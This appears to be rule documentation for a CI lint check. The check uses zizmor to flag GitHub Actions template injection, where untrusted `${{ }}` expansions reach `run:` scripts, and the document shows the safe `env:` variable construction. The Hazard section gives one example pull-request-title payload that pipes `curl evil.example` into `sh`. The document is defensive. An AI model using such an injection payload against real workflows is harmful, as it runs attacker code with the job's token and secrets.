# actionsqaci.zizmor.template-injection

## What it forbids or requires

A `${{ }}` expansion in a place that runs as code, most often a `run:` script, does not carry data
an attacker can set, such as `github.event.pull_request.title`, `github.event.issue.title` or a branch
name. The value is passed through an `env:` variable and the script reads it as a shell variable.

At the regular persona, which the lane runs by default, zizmor reports the expansions of contexts
an attacker can control. At the pedantic and auditor personas, which only the rule's own harness
shows until the project record's `enable` exists, it reports every expansion in a code context. The
audit works offline.

## Hazard

The runner substitutes the expansion into the script text before the shell sees it, and the
substitution knows no shell syntax. A pull request title of `"; curl evil.example | sh; "` becomes
a command in the job, which holds the job's token and secrets.

This rule owns the hazard class of an untrusted expression reaching a script. The potentially
untrusted `expression` messages of actionlint report the same hazard; a later change makes zizmor
the only reporter.

## Correct construction

```yaml
jobs:
  a:
    name: a
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      TITLE: ${{ github.event.pull_request.title }}
    steps:
      - name: hi
        run: echo "$TITLE"
```

Reference the variable with shell syntax (`"$TITLE"`), not as `${{ env.TITLE }}`, which would be
substituted into the script text again.

## Exceptions

An expansion that cannot carry attacker data, for example a value the workflow itself computes from
a fixed list, is recorded in the project record with the file, this identifier, the hazard, the
scope and the decision, held to the standard of `actionsqaci.unjustifiedException`. Prefer the
`env:` form, which costs nothing.

## Upstream

zizmor, the release the manifest pins: <https://docs.zizmor.sh/audits/#template-injection>
